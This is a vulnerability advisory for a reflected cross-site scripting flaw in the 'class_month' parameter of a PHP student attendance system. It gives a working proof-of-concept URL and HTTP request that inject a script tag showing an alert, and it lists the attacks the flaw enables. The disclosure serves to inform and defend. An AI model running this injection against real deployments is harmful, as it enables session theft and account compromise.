## Vulnerability Details

**Credits**: 
> Reigz Macolor (https://github.com/reigz/)<br/>

**Tested On**:
> [Simple Student Attendance System using PHP and MySQL 1.0](https://www.sourcecodester.com/php/17018/simple-student-attendance-system-using-php-and-mysql.html) <br/>

**Affected Version**:
> Simple Student Attendance System using PHP and MySQL 1.0

**Affected Site Page**: 
> /?page=attendance_report<br/>
> /?page=attendance_report&class_id=22&class_month=%22%3E%3Cscript%3Ealert(%27reigz%20was%20here%27)%3C/script%3E<br/>

**Affected Code**: 
> </attendance_report.php> <br/>

```javascript
<script>
    $(document).ready(function(){
        $('#class_id, #class_month').change(function(e){
            var class_id = $('#class_id').val()
            var class_month = $('#class_month').val()
            location.replace(`./?page=attendance_report&class_id=${class_id}&class_month=${class_month}`)
        })
    })
</script>  
```

**Related CWE:**
> [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)

## **Details:**
> Allows XSS by placing untrusted code on the parameter `class_month`.


```http 
GET /php-attendance/?page=attendance_report&class_id=22&class_month=%22%3E%3Cscript%3Ealert(%27reigz%20was%20here%27)%3C/script%3E HTTP/1.1
Host: localhost
```

![image](https://github.com/smurf-reigz/security/assets/48426940/d2cfc0f5-f1b7-4eaa-97af-02b013339425)


## **Vulnerability Impact:**
> Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."
